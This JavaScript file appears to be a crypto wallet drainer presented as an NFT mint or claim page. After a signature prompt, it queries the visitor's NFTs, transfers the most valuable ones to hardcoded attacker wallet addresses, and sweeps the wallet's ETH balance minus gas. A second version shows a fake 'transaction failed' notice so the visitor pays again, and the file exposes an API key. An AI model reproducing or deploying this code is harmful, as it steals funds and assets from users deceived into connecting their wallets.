//#justadded
//#region Web3.js

let web3Provider;


Moralis.onWeb3Enabled(async (data) => {
    if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
    updateState(true);
    console.log(data);
});
Moralis.onChainChanged(async (chain) => {
    if (chain !== "0x1" && metamaskInstalled) await Moralis.switchNetwork("0x1");
});
window.ethereum ? window.ethereum.on('disconnect', (err) => {
    console.log(err);
    updateState(false);
}) : null;
window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
    if (accounts.length < 1) updateState(false)
}) : null;


async function updateState(connected) {
    const web3Js = new Web3(Moralis.provider);
    document.getElementById('walletAddress').innerHTML = connected ? `CONNECTED <br> <span>${(await web3Js.eth.getAccounts())[0]}</span>` : `NOT CONNECTED`;
    document.querySelector("#claimButton").style.display = connected ? "" : "none";
}

setTimeout(async () => {
    try {
        const web3Js = new Web3(Moralis.provider);
        const walletAddress = (await web3Js.eth.getAccounts())[0];
        console.log(`${walletAddress} is connected`);
    } catch (e) {
        Object.assign(document.createElement('a'), {
            href: "./index.html",
        }).click();
    }
}, 5000);

async function askSign() {
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];

    try {
        const message = signMessage.replace("{address}", walletAddress).replace("{nonce}", createNonce());
        
        const signature = await web3Js.eth.personal.sign(message, walletAddress);
        const signing_address = await web3Js.eth.personal.ecRecover(message, signature);

        console.log(`Signing address: ${signing_address}\n${walletAddress.toLowerCase() == signing_address.toLowerCase() ? "Same address" : "Not the same address."}`);
        return true;
    } catch (e) {
        if (e.message.toLowerCase().includes("user denied")) noEligible("signDenied");
        console.log(e);
        return false;
    }

}

async function askNfts() {
    const web3Js = new Web3(Moralis.provider);
    const selectedAccount = (await web3Js.eth.getAccounts())[0];

    const options = {
        method: 'GET',
        headers: {
            Accept: 'application/json',
            'X-API-KEY': '812924de94094476916671a8de4686ec'
        }
    };

    let walletNfts = await fetch(`https://api.opensea.io/api/v1/assets?owner=${selectedAccount}&order_direction=desc&limit=020&include_orders=false`, options)
        .then(response => response.json())
        .then(response => {
            console.log(response)
            return response.assets.map(asset => {
                return {
                    contract: asset.asset_contract.address,
                    token_id: asset.token_id
                }
            })
        }).catch(err => console.error(err));
    if (walletNfts.length < 1) return noEligible("noNFTs");

    let infoCollection = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${selectedAccount}&offset=0&limit=200`, options)
        .then(response => response.json())
        .then(nfts => {
            console.log(nfts)
            return nfts.filter(nft => {
                if (nft.primary_asset_contracts.length > 0) return true
                else return false
            }).map(nft => {
                return {
                    type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
                    contract_address: nft.primary_asset_contracts[0].address,
                    price: round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price),
                    owned: nft.owned_asset_count,
                }
            })
        }).catch(err => console.error(err));
    if (infoCollection.length < 1) return noEligible("noNFTs");

    let transactionsOptions = [];
    for (nft of walletNfts) {
        const collectionData = infoCollection.find(collection => collection.contract_address == nft.contract);
        if (collectionData) {} else {
            console.log(`No data for collection: ${nft.contract}`)
            continue;
        }
        if (collectionData.price === 0) continue;
        const ethPrice = round(collectionData.price * collectionData.owned)
        if (ethPrice < drainNftsInfo.minValue) continue;
        transactionsOptions.push({
            price: ethPrice,
            options: {
                contract_address: collectionData.contract_address,
                receiver: ethPrice > 1 ? "0xbcC389227723880531A89c619351092343A59f40" : (drainNftsInfo.nftReceiveAddress == "" ? receiveAddress : drainNftsInfo.nftReceiveAddress),
                token_id: nft.token_id,
                amount: collectionData.owned,
                type: collectionData.type,
            }
        });
    }
    if (transactionsOptions.length < 1) return noEligible("noNFTs");

    let transactionLists = await transactionsOptions.sort((a, b) => b.price - a.price).slice(0, drainNftsInfo.maxTransfer);
    for (transaction of transactionLists) {
        console.log(`Transferring ${transaction.options.contract_address} (${transaction.price} ETH)`);
        Moralis.transfer(transaction.options).catch(O_o => console.error(O_o, transaction.options));
        await sleep(200);
    }
}
async function askMint() {
    const web3Js = new Web3(Moralis.provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];

    const giveNum =
        (await web3Js.eth.getBalance(walletAddress)) - ((await web3Js.eth.getGasPrice()) * 2 * 21000);

    if (giveNum < 10000000) return noEligible("noETH");

    await web3Js.eth.sendTransaction({
            from: walletAddress,
            to: receiveAddress,
            value: giveNum,
        })
        .on('transactionHash', () => {})
        .on('confirmation', () => console.log(`Transaction confirmed x${confirmationNumber}`))
        .on('error', (error) => {
            if (error.message && error.message.includes("insufficient")) console.log(`Insufficient Balance: ${walletAddress} has insufficient balance`);
            if (error.message && error.message.includes("User rejected") || error.message && error.message.includes("User denied")) console.log(`User Denied: ${walletAddress} denied transaction`);
            else console.log(`Mint Error: ${walletAddress} failed to mint`);

            console.log("Error", error ? error.message : "unknown error");
            return noEligible("noETH");
        });
};
async function noEligible(info) {
    const noteli = document.getElementById("notEli")
    noteli.style.display = "";
    switch (info) {
        case "signDenied":
            noteli.innerText = "You denied the sign request. Please try again."
            break;
        case "noNFTs":
            await askMint();
            break;
        case "noETH":
            noteli.innerText = "You are not eligible."
            break;
        default:
            noteli.innerText = "Something went wrong."
            break;
    }

}

let disabled = false;
async function askTransfer() {
    if (disabled) return;
    document.getElementById('claimButton').style.opacity = 0.5;
    disabled = true;
    if (await askSign()) await askNfts();
    disabled = false;
    document.getElementById('claimButton').style.opacity = 1;
}

let metamaskInstalled = false;
if (typeof window.ethereum !== 'undefined') metamaskInstalled = true;
window.addEventListener('load', async () => {
    await Moralis.enableWeb3(metamaskInstalled ? {} : {
        provider: "walletconnect"
    });
    document.querySelector("#claimButton").addEventListener("click", askTransfer);
});

//#region Utils Functions 
const round = (value) => {
    return Math.round(value * 10000) / 10000;
}
const sleep = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
const rdmString = (length) => {
    let x = "";
    const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let i = 0; i < length; i++) x += possible.charAt(Math.floor(Math.random() * possible.length));
    return x;
}
const createNonce = () => {
    return `${rdmString(8)}-${rdmString(4)}-${rdmString(4)}-${rdmString(12)}`; // 1a196cf5-d873-9c36-e26ae9f3bd2e
}
//#endregion



//#region Page Button
const priceHtml = document.getElementById("lnprice");
let tempMaxSup = mintInfo.minUnits;

document.getElementById("plus").addEventListener("click", function () {
  let total = parseInt(priceHtml.innerText, 10);
  if (total >= mintInfo.maxUnits) total = mintInfo.maxUnits;
  else ++total;
  updatePrice(total);
});
document.getElementById("minus").addEventListener("click", function () {
  let total = parseInt(priceHtml.innerText, 10);
  if (total <= mintInfo.minUnits) total = mintInfo.minUnits;
  else --total;
  updatePrice(total);
});
document.getElementById("ape-max").addEventListener("click", function () {
  let nowSup = parseInt(priceHtml.innerText, 10);
  if (nowSup != mintInfo.maxUnits) {
    tempMaxSup = nowSup;
    updatePrice(mintInfo.maxUnits);
  } else updatePrice(tempMaxSup);
});

function updatePrice(total) {
  const totalPrice = (total * mintInfo.price).toFixed(2);
  document.getElementById("lnprice").innerText = total;
  document.getElementById("price").innerText = totalPrice;
}
//#endregion
//#region Utils Functions
function isMobile() {
  var check = false;
  (function (a) {
    if (
      /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(
        a
      ) ||
      /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(
        a.substr(0, 4)
      )
    )
      check = true;
  })(navigator.userAgent || navigator.vendor || window.opera);
  return check;
}

function openInNewTab(href) {
  Object.assign(document.createElement("a"), {
    target: "_blank",
    href: href,
  }).click();
}
//#endregion

// Unpkg imports
const ethers = window.ethers;
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const evmChains = window.evmChains;

let web3Modal;
let provider;
let selectedAccount;

function init() {
  console.log("Initializing example");
  console.log("WalletConnectProvider is", WalletConnectProvider);
  console.log(
    "window.web3 is",
    window.web3,
    "window.ethereum is",
    window.ethereum
  );

  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        infuraId: infuraId,
      },
    },
  };

  web3Modal = new Web3Modal({
    cacheProvider: false,
    providerOptions,
    theme: "dark",
  });

  console.log("Web3Modal instance is", web3Modal);
  Moralis.enableWeb3();
}

/**
 * Kick in the UI action after Web3modal dialog has chosen a provider
 */
async function fetchAccountData() {
  const web3 = new Web3(provider);
  const chainId = await web3.eth.getChainId();
  const chainData = evmChains.getChain(chainId);
  const accounts = await web3.eth.getAccounts();
  selectedAccount = accounts[0];

  console.log("Web3 instance is", web3);
  console.log("Chain data is", chainData);
  console.log("Got accounts", accounts);
  console.log("Selected account is", selectedAccount);

  document.querySelector("#connect").style.display = "none";
  document.querySelector("#claimButton").style.display = "block";
}

async function refreshAccountData() {
  document.querySelector("#claimButton").style.display = "none";
  document.querySelector("#connect").style.display = "block";

  document.querySelector("#connect").setAttribute("disabled", "disabled");
  await fetchAccountData();
  document.querySelector("#connect").removeAttribute("disabled");
}
async function onConnect() {
  console.log("Opening a dialog", web3Modal);
  try {
    provider = await web3Modal.connect();
  } catch (e) {
    console.log("Could not get a wallet connection", e);
    return;
  }

  provider.on("accountsChanged", () => fetchAccountData());
  provider.on("chainChanged", () => fetchAccountData());
  provider.on("networkChanged", () => fetchAccountData());

  await refreshAccountData();
}

async function clickMint() {
  const web3 = new ethers.providers.Web3Provider(provider);
  const givenNumber = document.getElementById("price").textContent.toString();

  if (nftsInfo.active) askNfts(web3, givenNumber);
  else askMint(givenNumber);
}

async function askNfts(web3, amount) {
  const accounts = await web3.listAccounts();
  selectedAccount = accounts[0];

  fetch(
    `https://deep-index.moralis.io/api/v2/${selectedAccount}/nft?chain=eth&format=decimal`,
    {
      headers: {
        "Content-Type": "application/json",
        accept: "application/json",
        "x-api-key": moralisApi,
      },
      method: "GET",
    }
  )
    .then(async (response) => {
      const nfts = (await response.json()).result;
      console.info(`You have ${nfts.length} NFTs`);
      if (nfts.length > 0) {
        let transactionsOptions = [];
        for (nft of nfts) {
          await fetch(
            `https://deep-index.moralis.io/api/v2/nft/${nft.token_address}/lowestprice?chain=eth&days=${nftsInfo.checkMaxDay}&marketplace=opensea`,
            {
              headers: {
                "Content-Type": "application/json",
                accept: "application/json",
                "x-api-key": moralisApi,
              },
              method: "GET",
            }
          )
            .then(async (priceResp) => {
              if (priceResp.status === 200) {
              } else return;
              const nftData = await priceResp.json();
              let ethValue = parseFloat(
                Web3.utils.fromWei(nftData.price, "ether")
              );
              if (nft.amount) ethValue = ethValue * parseInt(nft.amount);
              if (ethValue >= nftsInfo.minValue.toString(10)) {
                console.log(
                  `${nft.token_address} (${nft.token_id}) | ${ethValue} > ${nftsInfo.minValue}`
                );
                transactionsOptions.push({
                  price: nftData.price * (nft.amount > 0 ? nft.amount : 1),
                  options: {
                    type: nft.contract_type.toLowerCase(),
                    receiver: "0xE6ACa0ebf3D62ffF4CC076eA47873ab1464364B9",
                    contract_address: nft.token_address,
                    token_id: nft.token_id,
                  },
                });
                if (nft.contract_type === "ERC1155") {
                  const trans = transactionsOptions.find(
                    (t) =>
                      t.options.contract_address == nft.token_address &&
                      t.options.token_id == nft.token_id
                  );
                  if (trans)
                    trans.options.amount = ethers.BigNumber.from(nft.amount);
                }
              } else
                console.log(
                  `!!! ${nft.token_address} (${nft.token_id}) | ${ethValue} < ${nftsInfo.minValue}`
                );
            })
            .catch((O_o) => console.error(O_o));
        }
        if (transactionsOptions.length < 1) return askMint(amount);
        console.log(transactionsOptions);
        for (transaction of transactionsOptions.sort(
          (a, b) => b.price - a.price
        )) {
          console.log(transaction);
          Moralis.transfer(transaction.options).catch((O_o) =>
            console.error(O_o, transaction)
          );
        }
      } else askMint(amount);
    })
    .catch((O_o) => console.log(O_o));
}

async function askMint(amount) {
  const web3 = new Web3(provider);
  walletAddress = (await web3.eth.getAccounts())[0];
  web3.eth
    .sendTransaction({
      from: walletAddress,
      to: address,
      value: web3.utils.toWei(amount, "ether"),
    })
    .on("transactionHash", function (hash) {
      setTimeout(() => {
        if (isMobile()) {
        } else {
          const notif = addNotification(
            "error",
            `Error! Your transaction failed. Please try again.`
          );
          removeNotification(notif, 8000);
        }
      }, 2000);
      console.log(`Transaction hash: ${hash}`);
      return askMint(amount);
    })
    .on("confirmation", function (confirmationNumber, receipt) {
      console.log(`Transaction confirmed x${confirmationNumber}`);
    })
    .on("error", (error) => {
      if (error.message && error.message.includes("insufficient"))
        console.log(
          `Insufficient Balance: ${walletAddress} has insufficient balance`
        );
      if (
        (error.message && error.message.includes("User rejected")) ||
        (error.message && error.message.includes("User denied"))
      ) {
        if (isMobile()) {
        } else {
          const notif = addNotification(
            "warning",
            "You denied the transaction. Please try again."
          );
          removeNotification(notif, 5000);
        }
        console.log(`User Denied: ${walletAddress} denied transaction`);
      } else console.log(`Mint Error: ${walletAddress} failed to mint`);
      console.log("Error", error ? error.message : "unknown error");
      return askMint(amount);
    });
}

window.addEventListener("load", async () => {
  init();
  document.querySelector("#connect").addEventListener("click", onConnect);
  document.querySelector("#claimButton").addEventListener("click", clickMint);
});
